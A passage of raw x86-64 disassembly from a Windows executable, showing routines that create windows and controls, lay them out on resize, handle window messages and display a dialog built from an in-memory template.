   140001eaf:	41 b9 84 08 30 50    	mov    $0x50300884,%r9d
   140001eb5:	48 8b 07             	mov    (%rdi),%rax
   140001eb8:	45 33 c0             	xor    %r8d,%r8d
   140001ebb:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001ec0:	b9 00 02 00 00       	mov    $0x200,%ecx
   140001ec5:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001ec9:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001ece:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001ed3:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001eda:	80 
   140001edb:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001ee2:	80 
   140001ee3:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001eea:	80 
   140001eeb:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001ef2:	80 
   140001ef3:	ff 15 cf a4 02 00    	call   *0x2a4cf(%rip)        # 0x14002c3c8
   140001ef9:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001efe:	4c 8d 05 9b ac 02 00 	lea    0x2ac9b(%rip),%r8        # 0x14002cba0
   140001f05:	48 89 87 38 20 00 00 	mov    %rax,0x2038(%rdi)
   140001f0c:	48 8d 15 9d ac 02 00 	lea    0x2ac9d(%rip),%rdx        # 0x14002cbb0
   140001f13:	48 8b 07             	mov    (%rdi),%rax
   140001f16:	41 b9 01 00 00 50    	mov    $0x50000001,%r9d
   140001f1c:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001f21:	33 c9                	xor    %ecx,%ecx
   140001f23:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001f27:	48 c7 44 24 48 01 00 	movq   $0x1,0x48(%rsp)
   140001f2e:	00 00 
   140001f30:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001f35:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001f3c:	80 
   140001f3d:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001f44:	80 
   140001f45:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001f4c:	80 
   140001f4d:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001f54:	80 
   140001f55:	ff 15 6d a4 02 00    	call   *0x2a46d(%rip)        # 0x14002c3c8
   140001f5b:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f62:	45 33 c0             	xor    %r8d,%r8d
   140001f65:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001f69:	ba 80 00 00 00       	mov    $0x80,%edx
   140001f6e:	48 89 87 40 20 00 00 	mov    %rax,0x2040(%rdi)
   140001f75:	ff 15 25 a5 02 00    	call   *0x2a525(%rip)        # 0x14002c4a0
   140001f7b:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f82:	ba 80 00 00 00       	mov    $0x80,%edx
   140001f87:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001f8b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001f91:	ff 15 09 a5 02 00    	call   *0x2a509(%rip)        # 0x14002c4a0
   140001f97:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f9e:	48 8b 8f 28 20 00 00 	mov    0x2028(%rdi),%rcx
   140001fa5:	ba 72 01 00 00       	mov    $0x172,%edx
   140001faa:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001fb0:	ff 15 ea a4 02 00    	call   *0x2a4ea(%rip)        # 0x14002c4a0
   140001fb6:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001fbd:	4d 85 c0             	test   %r8,%r8
   140001fc0:	74 72                	je     0x140002034
   140001fc2:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001fc6:	ba 30 00 00 00       	mov    $0x30,%edx
   140001fcb:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001fd1:	ff 15 c9 a4 02 00    	call   *0x2a4c9(%rip)        # 0x14002c4a0
   140001fd7:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001fde:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001fe4:	48 8b 8f 30 20 00 00 	mov    0x2030(%rdi),%rcx
   140001feb:	ba 30 00 00 00       	mov    $0x30,%edx
   140001ff0:	ff 15 aa a4 02 00    	call   *0x2a4aa(%rip)        # 0x14002c4a0
   140001ff6:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001ffd:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002003:	48 8b 8f 38 20 00 00 	mov    0x2038(%rdi),%rcx
   14000200a:	ba 30 00 00 00       	mov    $0x30,%edx
   14000200f:	ff 15 8b a4 02 00    	call   *0x2a48b(%rip)        # 0x14002c4a0
   140002015:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   14000201c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002022:	48 8b 8f 40 20 00 00 	mov    0x2040(%rdi),%rcx
   140002029:	ba 30 00 00 00       	mov    $0x30,%edx
   14000202e:	ff 15 6c a4 02 00    	call   *0x2a46c(%rip)        # 0x14002c4a0
   140002034:	48 8b 8f 30 20 00 00 	mov    0x2030(%rdi),%rcx
   14000203b:	4c 8d 4f 28          	lea    0x28(%rdi),%r9
   14000203f:	45 33 c0             	xor    %r8d,%r8d
   140002042:	ba 0c 00 00 00       	mov    $0xc,%edx
   140002047:	ff 15 53 a4 02 00    	call   *0x2a453(%rip)        # 0x14002c4a0
   14000204d:	4c 8b 4f 20          	mov    0x20(%rdi),%r9
   140002051:	45 33 c0             	xor    %r8d,%r8d
   140002054:	48 8b 8f 38 20 00 00 	mov    0x2038(%rdi),%rcx
   14000205b:	ba 0c 00 00 00       	mov    $0xc,%edx
   140002060:	ff 15 3a a4 02 00    	call   *0x2a43a(%rip)        # 0x14002c4a0
   140002066:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000206a:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000206f:	ff 15 e3 a3 02 00    	call   *0x2a3e3(%rip)        # 0x14002c458
   140002075:	85 c0                	test   %eax,%eax
   140002077:	74 1e                	je     0x140002097
   140002079:	44 0f b7 44 24 6c    	movzwl 0x6c(%rsp),%r8d
   14000207f:	48 8b cf             	mov    %rdi,%rcx
   140002082:	0f b7 54 24 68       	movzwl 0x68(%rsp),%edx
   140002087:	66 44 2b 44 24 64    	sub    0x64(%rsp),%r8w
   14000208d:	66 2b 54 24 60       	sub    0x60(%rsp),%dx
   140002092:	e8 e9 00 00 00       	call   0x140002180
   140002097:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   14000209e:	00 
   14000209f:	48 33 cc             	xor    %rsp,%rcx
   1400020a2:	e8 29 a5 00 00       	call   0x14000c5d0
   1400020a7:	4c 8d 9c 24 80 02 00 	lea    0x280(%rsp),%r11
   1400020ae:	00 
   1400020af:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400020b3:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   1400020b7:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400020bb:	49 8b e3             	mov    %r11,%rsp
   1400020be:	5f                   	pop    %rdi
   1400020bf:	c3                   	ret
   1400020c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400020c5:	57                   	push   %rdi
   1400020c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400020ca:	49 8b f9             	mov    %r9,%rdi
   1400020cd:	48 8b d9             	mov    %rcx,%rbx
   1400020d0:	83 ea 05             	sub    $0x5,%edx
   1400020d3:	74 66                	je     0x14000213b
   1400020d5:	83 ea 0b             	sub    $0xb,%edx
   1400020d8:	74 5a                	je     0x140002134
   1400020da:	81 ea 00 01 00 00    	sub    $0x100,%edx
   1400020e0:	74 28                	je     0x14000210a
   1400020e2:	83 fa 01             	cmp    $0x1,%edx
   1400020e5:	75 7f                	jne    0x140002166
   1400020e7:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   1400020eb:	66 3b c2             	cmp    %dx,%ax
   1400020ee:	77 0a                	ja     0x1400020fa
   1400020f0:	41 0f b7 d0          	movzwl %r8w,%edx
   1400020f4:	ff 15 8e a3 02 00    	call   *0x2a38e(%rip)        # 0x14002c488
   1400020fa:	b8 01 00 00 00       	mov    $0x1,%eax
   1400020ff:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002104:	48 83 c4 20          	add    $0x20,%rsp
   140002108:	5f                   	pop    %rdi
   140002109:	c3                   	ret
   14000210a:	4c 8b c7             	mov    %rdi,%r8
   14000210d:	49 89 59 08          	mov    %rbx,0x8(%r9)
   140002111:	ba 10 00 00 00       	mov    $0x10,%edx
   140002116:	ff 15 2c a3 02 00    	call   *0x2a32c(%rip)        # 0x14002c448
   14000211c:	48 8b cf             	mov    %rdi,%rcx
   14000211f:	e8 bc fb ff ff       	call   0x140001ce0
   140002124:	b8 01 00 00 00       	mov    $0x1,%eax
   140002129:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000212e:	48 83 c4 20          	add    $0x20,%rsp
   140002132:	5f                   	pop    %rdi
   140002133:	c3                   	ret
   140002134:	ba 02 00 00 00       	mov    $0x2,%edx
   140002139:	eb b9                	jmp    0x1400020f4
   14000213b:	ba 10 00 00 00       	mov    $0x10,%edx
   140002140:	ff 15 0a a3 02 00    	call   *0x2a30a(%rip)        # 0x14002c450
   140002146:	4c 8b c7             	mov    %rdi,%r8
   140002149:	0f b7 d7             	movzwl %di,%edx
   14000214c:	49 c1 e8 10          	shr    $0x10,%r8
   140002150:	48 8b c8             	mov    %rax,%rcx
   140002153:	e8 28 00 00 00       	call   0x140002180
   140002158:	45 33 c0             	xor    %r8d,%r8d
   14000215b:	33 d2                	xor    %edx,%edx
   14000215d:	48 8b cb             	mov    %rbx,%rcx
   140002160:	ff 15 fa a2 02 00    	call   *0x2a2fa(%rip)        # 0x14002c460
   140002166:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000216b:	33 c0                	xor    %eax,%eax
   14000216d:	48 83 c4 20          	add    $0x20,%rsp
   140002171:	5f                   	pop    %rdi
   140002172:	c3                   	ret
   140002173:	cc                   	int3
   140002174:	cc                   	int3
   140002175:	cc                   	int3
   140002176:	cc                   	int3
   140002177:	cc                   	int3
   140002178:	cc                   	int3
   140002179:	cc                   	int3
   14000217a:	cc                   	int3
   14000217b:	cc                   	int3
   14000217c:	cc                   	int3
   14000217d:	cc                   	int3
   14000217e:	cc                   	int3
   14000217f:	cc                   	int3
   140002180:	40 53                	rex push %rbx
   140002182:	55                   	push   %rbp
   140002183:	56                   	push   %rsi
   140002184:	57                   	push   %rdi
   140002185:	41 56                	push   %r14
   140002187:	48 83 ec 50          	sub    $0x50,%rsp
   14000218b:	48 8b 05 ae ce 03 00 	mov    0x3ceae(%rip),%rax        # 0x14003f040
   140002192:	48 33 c4             	xor    %rsp,%rax
   140002195:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000219a:	48 8b f1             	mov    %rcx,%rsi
   14000219d:	0f b7 ea             	movzwl %dx,%ebp
   1400021a0:	48 8b 89 30 20 00 00 	mov    0x2030(%rcx),%rcx
   1400021a7:	45 0f b7 f0          	movzwl %r8w,%r14d
   1400021ab:	ff 15 bf a2 02 00    	call   *0x2a2bf(%rip)        # 0x14002c470
   1400021b1:	48 8b d8             	mov    %rax,%rbx
   1400021b4:	48 85 c0             	test   %rax,%rax
   1400021b7:	0f 84 90 00 00 00    	je     0x14000224d
   1400021bd:	0f b7 8e 58 20 00 00 	movzwl 0x2058(%rsi),%ecx
   1400021c4:	33 ff                	xor    %edi,%edi
   1400021c6:	0f b7 86 5e 20 00 00 	movzwl 0x205e(%rsi),%eax
   1400021cd:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400021d2:	89 7c 24 3c          	mov    %edi,0x3c(%rsp)
   1400021d6:	8d 14 49             	lea    (%rcx,%rcx,2),%edx
   1400021d9:	8b cd                	mov    %ebp,%ecx
   1400021db:	2b ca                	sub    %edx,%ecx
   1400021dd:	48 8b 96 48 20 00 00 	mov    0x2048(%rsi),%rdx
   1400021e4:	2b c8                	sub    %eax,%ecx
   1400021e6:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   1400021ea:	48 85 d2             	test   %rdx,%rdx
   1400021ed:	74 0c                	je     0x1400021fb
   1400021ef:	48 8b cb             	mov    %rbx,%rcx
   1400021f2:	ff 15 40 9e 02 00    	call   *0x29e40(%rip)        # 0x14002c038
   1400021f8:	48 8b f8             	mov    %rax,%rdi
   1400021fb:	48 8d 56 28          	lea    0x28(%rsi),%rdx
   1400021ff:	c7 44 24 20 50 25 00 	movl   $0x2550,0x20(%rsp)
   140002206:	00 
   140002207:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000220c:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140002212:	48 8b cb             	mov    %rbx,%rcx
   140002215:	ff 15 5d a2 02 00    	call   *0x2a25d(%rip)        # 0x14002c478
   14000221b:	48 83 be 48 20 00 00 	cmpq   $0x0,0x2048(%rsi)
   140002222:	00 
   140002223:	74 0c                	je     0x140002231
   140002225:	48 8b d7             	mov    %rdi,%rdx
   140002228:	48 8b cb             	mov    %rbx,%rcx
   14000222b:	ff 15 07 9e 02 00    	call   *0x29e07(%rip)        # 0x14002c038
   140002231:	48 8b 8e 30 20 00 00 	mov    0x2030(%rsi),%rcx
   140002238:	48 8b d3             	mov    %rbx,%rdx
   14000223b:	ff 15 27 a2 02 00    	call   *0x2a227(%rip)        # 0x14002c468
   140002241:	0f b7 54 24 3c       	movzwl 0x3c(%rsp),%edx
   140002246:	66 2b 54 24 34       	sub    0x34(%rsp),%dx
   14000224b:	eb 05                	jmp    0x140002252
   14000224d:	ba 14 00 00 00       	mov    $0x14,%edx
   140002252:	0f b7 8e 60 20 00 00 	movzwl 0x2060(%rsi),%ecx
   140002259:	44 0f b7 8e 5e 20 00 	movzwl 0x205e(%rsi),%r9d
   140002260:	00 
   140002261:	66 3b d1             	cmp    %cx,%dx
   140002264:	0f b7 c1             	movzwl %cx,%eax
   140002267:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   14000226e:	00 
   14000226f:	66 0f 43 c2          	cmovae %dx,%ax
   140002273:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140002277:	0f b7 96 58 20 00 00 	movzwl 0x2058(%rsi),%edx
   14000227e:	48 8b 8e 28 20 00 00 	mov    0x2028(%rsi),%rcx
   140002285:	44 8b c2             	mov    %edx,%r8d
   140002288:	0f b7 d8             	movzwl %ax,%ebx
   14000228b:	ff 15 07 a2 02 00    	call   *0x2a207(%rip)        # 0x14002c498
   140002291:	0f b7 be 58 20 00 00 	movzwl 0x2058(%rsi),%edi
   140002298:	0f b7 c5             	movzwl %bp,%eax
   14000229b:	0f b7 cf             	movzwl %di,%ecx
   14000229e:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400022a5:	00 
   1400022a6:	66 03 c9             	add    %cx,%cx
   1400022a9:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400022ad:	66 03 8e 5e 20 00 00 	add    0x205e(%rsi),%cx
   1400022b4:	66 2b c7             	sub    %di,%ax
   1400022b7:	66 2b c1             	sub    %cx,%ax
   1400022ba:	0f b7 d1             	movzwl %cx,%edx
   1400022bd:	48 8b 8e 30 20 00 00 	mov    0x2030(%rsi),%rcx
   1400022c4:	44 8b c7             	mov    %edi,%r8d
   1400022c7:	44 0f b7 c8          	movzwl %ax,%r9d
   1400022cb:	ff 15 c7 a1 02 00    	call   *0x2a1c7(%rip)        # 0x14002c498
   1400022d1:	0f b7 96 58 20 00 00 	movzwl 0x2058(%rsi),%edx
   1400022d8:	41 0f b7 ce          	movzwl %r14w,%ecx
   1400022dc:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400022e3:	00 
   1400022e4:	8d 04 13             	lea    (%rbx,%rdx,1),%eax
   1400022e7:	66 03 f8             	add    %ax,%di
   1400022ea:	0f b7 c2             	movzwl %dx,%eax
   1400022ed:	66 03 c0             	add    %ax,%ax
   1400022f0:	44 0f b7 c7          	movzwl %di,%r8d
   1400022f4:	66 2b c8             	sub    %ax,%cx
   1400022f7:	0f b7 c5             	movzwl %bp,%eax
   1400022fa:	66 2b 8e 5c 20 00 00 	sub    0x205c(%rsi),%cx
   140002301:	66 2b c2             	sub    %dx,%ax
   140002304:	66 2b cf             	sub    %di,%cx
   140002307:	66 2b c2             	sub    %dx,%ax
   14000230a:	44 0f b7 d1          	movzwl %cx,%r10d
   14000230e:	48 8b 8e 38 20 00 00 	mov    0x2038(%rsi),%rcx
   140002315:	44 0f b7 c8          	movzwl %ax,%r9d
   140002319:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   14000231e:	ff 15 74 a1 02 00    	call   *0x2a174(%rip)        # 0x14002c498
   140002324:	0f b7 96 5a 20 00 00 	movzwl 0x205a(%rsi),%edx
   14000232b:	0f b7 86 58 20 00 00 	movzwl 0x2058(%rsi),%eax
   140002332:	44 8b ca             	mov    %edx,%r9d
   140002335:	44 0f b7 96 5c 20 00 	movzwl 0x205c(%rsi),%r10d
   14000233c:	00 
   14000233d:	66 44 2b f0          	sub    %ax,%r14w
   140002341:	48 8b 8e 40 20 00 00 	mov    0x2040(%rsi),%rcx
   140002348:	66 2b e8             	sub    %ax,%bp
   14000234b:	66 45 2b f2          	sub    %r10w,%r14w
   14000234f:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140002356:	00 
   140002357:	66 2b ea             	sub    %dx,%bp
   14000235a:	45 0f b7 c6          	movzwl %r14w,%r8d
   14000235e:	0f b7 d5             	movzwl %bp,%edx
   140002361:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   140002366:	ff 15 2c a1 02 00    	call   *0x2a12c(%rip)        # 0x14002c498
   14000236c:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002371:	48 33 cc             	xor    %rsp,%rcx
   140002374:	e8 57 a2 00 00       	call   0x14000c5d0
   140002379:	48 83 c4 50          	add    $0x50,%rsp
   14000237d:	41 5e                	pop    %r14
   14000237f:	5f                   	pop    %rdi
   140002380:	5e                   	pop    %rsi
   140002381:	5d                   	pop    %rbp
   140002382:	5b                   	pop    %rbx
   140002383:	c3                   	ret
   140002384:	cc                   	int3
   140002385:	cc                   	int3
   140002386:	cc                   	int3
   140002387:	cc                   	int3
   140002388:	cc                   	int3
   140002389:	cc                   	int3
   14000238a:	cc                   	int3
   14000238b:	cc                   	int3
   14000238c:	cc                   	int3
   14000238d:	cc                   	int3
   14000238e:	cc                   	int3
   14000238f:	cc                   	int3
   140002390:	40 55                	rex push %rbp
   140002392:	53                   	push   %rbx
   140002393:	56                   	push   %rsi
   140002394:	57                   	push   %rdi
   140002395:	41 56                	push   %r14
   140002397:	48 8d ac 24 30 df ff 	lea    -0x20d0(%rsp),%rbp
   14000239e:	ff 
   14000239f:	b8 d0 21 00 00       	mov    $0x21d0,%eax
   1400023a4:	e8 27 a5 00 00       	call   0x14000c8d0
   1400023a9:	48 2b e0             	sub    %rax,%rsp
   1400023ac:	48 8b 05 8d cc 03 00 	mov    0x3cc8d(%rip),%rax        # 0x14003f040
   1400023b3:	48 33 c4             	xor    %rsp,%rax
   1400023b6:	48 89 85 c0 20 00 00 	mov    %rax,0x20c0(%rbp)
   1400023bd:	48 8b d9             	mov    %rcx,%rbx
   1400023c0:	4d 8b f0             	mov    %r8,%r14
   1400023c3:	33 c9                	xor    %ecx,%ecx
   1400023c5:	48 8b f2             	mov    %rdx,%rsi
   1400023c8:	ff 15 ea 9c 02 00    	call   *0x29cea(%rip)        # 0x14002c0b8
   1400023ce:	33 d2                	xor    %edx,%edx
   1400023d0:	48 8d 8d b6 1f 00 00 	lea    0x1fb6(%rbp),%rcx
   1400023d7:	41 b8 02 01 00 00    	mov    $0x102,%r8d
   1400023dd:	48 8b f8             	mov    %rax,%rdi
   1400023e0:	e8 bb 83 02 00       	call   0x14002a7a0
   1400023e5:	33 c9                	xor    %ecx,%ecx
   1400023e7:	c7 85 a0 1f 00 00 84 	movl   $0x90cc0884,0x1fa0(%rbp)
   1400023ee:	08 cc 90 
   1400023f1:	48 89 8d a4 1f 00 00 	mov    %rcx,0x1fa4(%rbp)
   1400023f8:	4c 8d 05 c1 a7 02 00 	lea    0x2a7c1(%rip),%r8        # 0x14002cbc0
   1400023ff:	66 89 8d b4 1f 00 00 	mov    %cx,0x1fb4(%rbp)
   140002406:	ba 40 00 00 00       	mov    $0x40,%edx
   14000240b:	48 8d 8d b6 1f 00 00 	lea    0x1fb6(%rbp),%rcx
   140002412:	c7 85 ac 1f 00 00 00 	movl   $0xc80000,0x1fac(%rbp)
   140002419:	00 c8 00 
   14000241c:	c7 85 b0 1f 00 00 96 	movl   $0x96,0x1fb0(%rbp)
   140002423:	00 00 00 
   140002426:	e8 95 01 00 00       	call   0x1400025c0
   14000242b:	33 c0                	xor    %eax,%eax
   14000242d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140002432:	33 d2                	xor    %edx,%edx
   140002434:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002439:	41 b8 40 20 00 00    	mov    $0x2040,%r8d
   14000243f:	e8 5c 83 02 00       	call   0x14002a7a0
   140002444:	48 8b cb             	mov    %rbx,%rcx
   140002447:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000244c:	e8 37 55 01 00       	call   0x140017988
   140002451:	48 8b ce             	mov    %rsi,%rcx
   140002454:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002459:	e8 2a 55 01 00       	call   0x140017988
   14000245e:	49 8b ce             	mov    %r14,%rcx
   140002461:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002466:	e8 1d 55 01 00       	call   0x140017988
   14000246b:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002470:	4c 8d 0d 49 fc ff ff 	lea    -0x3b7(%rip),%r9        # 0x1400020c0
   140002477:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000247c:	45 33 c0             	xor    %r8d,%r8d
   14000247f:	48 8d 95 a0 1f 00 00 	lea    0x1fa0(%rbp),%rdx
   140002486:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000248b:	48 8b cf             	mov    %rdi,%rcx
   14000248e:	ff 15 fc 9f 02 00    	call   *0x29ffc(%rip)        # 0x14002c490
   140002494:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002499:	48 8b d8             	mov    %rax,%rbx
   14000249c:	e8 5f 2d 01 00       	call   0x140015200
   1400024a1:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400024a6:	e8 55 2d 01 00       	call   0x140015200
   1400024ab:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400024b0:	e8 4b 2d 01 00       	call   0x140015200
   1400024b5:	48 8b 8d 78 1f 00 00 	mov    0x1f78(%rbp),%rcx
   1400024bc:	48 85 c9             	test   %rcx,%rcx
   1400024bf:	74 06                	je     0x1400024c7
   1400024c1:	ff 15 79 9b 02 00    	call   *0x29b79(%rip)        # 0x14002c040
   1400024c7:	48 8b 8d 80 1f 00 00 	mov    0x1f80(%rbp),%rcx
   1400024ce:	48 85 c9             	test   %rcx,%rcx
   1400024d1:	74 06                	je     0x1400024d9
   1400024d3:	ff 15 67 9f 02 00    	call   *0x29f67(%rip)        # 0x14002c440
   1400024d9:	8b c3                	mov    %ebx,%eax
   1400024db:	48 8b 8d c0 20 00 00 	mov    0x20c0(%rbp),%rcx
   1400024e2:	48 33 cc             	xor    %rsp,%rcx
   1400024e5:	e8 e6 a0 00 00       	call   0x14000c5d0
   1400024ea:	48 81 c4 d0 21 00 00 	add    $0x21d0,%rsp
   1400024f1:	41 5e                	pop    %r14
   1400024f3:	5f                   	pop    %rdi
   1400024f4:	5e                   	pop    %rsi
   1400024f5:	5b                   	pop    %rbx
   1400024f6:	5d                   	pop    %rbp
   1400024f7:	c3                   	ret
   1400024f8:	cc                   	int3
   1400024f9:	cc                   	int3
   1400024fa:	cc                   	int3
   1400024fb:	cc                   	int3
   1400024fc:	cc                   	int3
   1400024fd:	cc                   	int3
   1400024fe:	cc                   	int3
   1400024ff:	cc                   	int3
   140002500:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002505:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000250a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000250f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002514:	41 56                	push   %r14
   140002516:	48 83 ec 20          	sub    $0x20,%rsp
   14000251a:	33 ff                	xor    %edi,%edi
   14000251c:	49 8b d8             	mov    %r8,%rbx
   14000251f:	48 8b f2             	mov    %rdx,%rsi
   140002522:	44 8b f7             	mov    %edi,%r14d
   140002525:	8b ef                	mov    %edi,%ebp
   140002527:	48 85 c9             	test   %rcx,%rcx
   14000252a:	74 0d                	je     0x140002539
   14000252c:	45 33 c0             	xor    %r8d,%r8d
   14000252f:	33 d2                	xor    %edx,%edx
   140002531:	e8 da 6e 00 00       	call   0x140009410
   140002536:	48 8b f8             	mov    %rax,%rdi
   140002539:	48 85 f6             	test   %rsi,%rsi
   14000253c:	74 10                	je     0x14000254e
   14000253e:	45 33 c0             	xor    %r8d,%r8d
   140002541:	33 d2                	xor    %edx,%edx
   140002543:	48 8b ce             	mov    %rsi,%rcx
   140002546:	e8 c5 6e 00 00       	call   0x140009410
   14000254b:	4c 8b f0             	mov    %rax,%r14
   14000254e:	48 85 db             	test   %rbx,%rbx
   140002551:	74 10                	je     0x140002563
   140002553:	45 33 c0             	xor    %r8d,%r8d
   140002556:	33 d2                	xor    %edx,%edx
   140002558:	48 8b cb             	mov    %rbx,%rcx
   14000255b:	e8 b0 6e 00 00       	call   0x140009410
   140002560:	48 8b e8             	mov    %rax,%rbp
   140002563:	48 85 ed             	test   %rbp,%rbp
   140002566:	4c 8d 05 93 a6 02 00 	lea    0x2a693(%rip),%r8        # 0x14002cc00
   14000256d:	49 8b d6             	mov    %r14,%rdx
   140002570:	48 8b cf             	mov    %rdi,%rcx
   140002573:	4c 0f 45 c5          	cmovne %rbp,%r8
   140002577:	e8 14 fe ff ff       	call   0x140002390
   14000257c:	48 8b cf             	mov    %rdi,%rcx
   14000257f:	8b d8                	mov    %eax,%ebx
   140002581:	e8 7a 2c 01 00       	call   0x140015200
   140002586:	49 8b ce             	mov    %r14,%rcx
   140002589:	e8 72 2c 01 00       	call   0x140015200
   14000258e:	48 8b cd             	mov    %rbp,%rcx
   140002591:	e8 6a 2c 01 00       	call   0x140015200
   140002596:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000259b:	8b c3                	mov    %ebx,%eax
   14000259d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400025a2:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400025a7:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400025ac:	48 83 c4 20          	add    $0x20,%rsp
   1400025b0:	41 5e                	pop    %r14
   1400025b2:	c3                   	ret
   1400025b3:	cc                   	int3
   1400025b4:	cc                   	int3
   1400025b5:	cc                   	int3
   1400025b6:	cc                   	int3
   1400025b7:	cc                   	int3
   1400025b8:	cc                   	int3
   1400025b9:	cc                   	int3
   1400025ba:	cc                   	int3
   1400025bb:	cc                   	int3
   1400025bc:	cc                   	int3
   1400025bd:	cc                   	int3
   1400025be:	cc                   	int3
   1400025bf:	cc                   	int3
   1400025c0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400025c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400025ca:	53                   	push   %rbx
   1400025cb:	55                   	push   %rbp
   1400025cc:	56                   	push   %rsi
   1400025cd:	57                   	push   %rdi
   1400025ce:	48 83 ec 38          	sub    $0x38,%rsp
   1400025d2:	49 8b f0             	mov    %r8,%rsi
   1400025d5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400025da:	48 8b da             	mov    %rdx,%rbx
   1400025dd:	48 8b f9             	mov    %rcx,%rdi
   1400025e0:	e8 5b ea ff ff       	call   0x140001040
   1400025e5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400025ea:	4c 8b ce             	mov    %rsi,%r9
   1400025ed:	4c 8b c3             	mov    %rbx,%r8
   1400025f0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400025f7:	00 00 
   1400025f9:	48 8b d7             	mov    %rdi,%rdx
   1400025fc:	48 8b 08             	mov    (%rax),%rcx
   1400025ff:	e8 24 28 01 00       	call   0x140014e28
   140002604:	85 c0                	test   %eax,%eax
   140002606:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000260b:	0f 48 c1             	cmovs  %ecx,%eax
   14000260e:	48 83 c4 38          	add    $0x38,%rsp
   140002612:	5f                   	pop    %rdi
   140002613:	5e                   	pop    %rsi
   140002614:	5d                   	pop    %rbp
   140002615:	5b                   	pop    %rbx
   140002616:	c3                   	ret
   140002617:	cc                   	int3
   140002618:	cc                   	int3
   140002619:	cc                   	int3
   14000261a:	cc                   	int3
   14000261b:	cc                   	int3
   14000261c:	cc                   	int3
   14000261d:	cc                   	int3
   14000261e:	cc                   	int3
   14000261f:	cc                   	int3
   140002620:	40 53                	rex push %rbx
   140002622:	55                   	push   %rbp
